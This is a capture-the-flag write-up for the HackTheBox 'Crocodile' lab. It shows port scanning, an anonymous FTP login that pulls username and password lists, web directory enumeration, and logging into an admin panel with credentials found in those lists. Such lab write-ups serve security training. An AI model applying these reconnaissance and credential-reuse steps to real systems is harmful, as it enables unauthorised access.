# [HackTheBox] [Crocodile]: [Enumeration], [Foothold]

**Target:** [Crocodile] | **OS:** Linux | **Difficulty:** Super Easy  
**Attack Vector:** [Enumeration -> Foothold]

---

## 1. Enumeration

```bash
sudo nmap -p- -sS ---min-rate 5000 -T3 10.129.130.116
```

`PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http`

We have port 21 open lets try the obvious way to get in first

## 2. Foothold

```shell
➜ ftp 10.129.130.116
Connected to 10.129.130.116.
220 (vsFTPd 3.0.3)
Name (10.129.130.116:yoel): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
226 Directory send OK.
ftp> get allowed.userlist
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for allowed.userlist (33 bytes).
226 Transfer complete.
33 bytes received in 0.0016 seconds (20.4063 kbytes/s)
ftp> get allowed.userlist.passwd
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for allowed.userlist.passwd (62 bytes).
226 Transfer complete.
62 bytes received in 0.0013 seconds (45.5076 kbytes/s)
ftp> quit
221 Goodbye.
```

```shell
➜ cat allowed.userlist
aron
pwnmeow
egotisticalsw
admin
➜ cat allowed.userlist.passwd
root
Supersecretpassword1
@BaASD&9032123sADS
rKXM59ESxesUFHAd
```

Here we can use password spray and Brute Force but on what?

```shell
➜ gobuster dir -u http://10.129.130.116/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.130.116/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta                 (Status: 403) [Size: 279]
.htaccess            (Status: 403) [Size: 279]
.htpasswd            (Status: 403) [Size: 279]
assets               (Status: 301) [Size: 317] [--> http://10.129.130.116/assets/]
css                  (Status: 301) [Size: 314] [--> http://10.129.130.116/css/]
dashboard            (Status: 301) [Size: 320] [--> http://10.129.130.116/dashboard/]
fonts                (Status: 301) [Size: 316] [--> http://10.129.130.116/fonts/]
index.html           (Status: 200) [Size: 58565]
js                   (Status: 301) [Size: 313] [--> http://10.129.130.116/js/]
server-status        (Status: 403) [Size: 279]
Progress: 4752 / 4752 (100.00%)
===============================================================
Finished
===============================================================
```

If we check `http://10.129.130.116/dashboard` it redirects us to `http://10.129.130.116/login.php`

And after a few attempts `admin` and `rKXM59ESxesUFHAd` was the combination 

## 3. Flag

![Image](https://raw.githubusercontent.com/zyoel/writeups/main/htb/crocodile/assets/search.png)

Pwned.
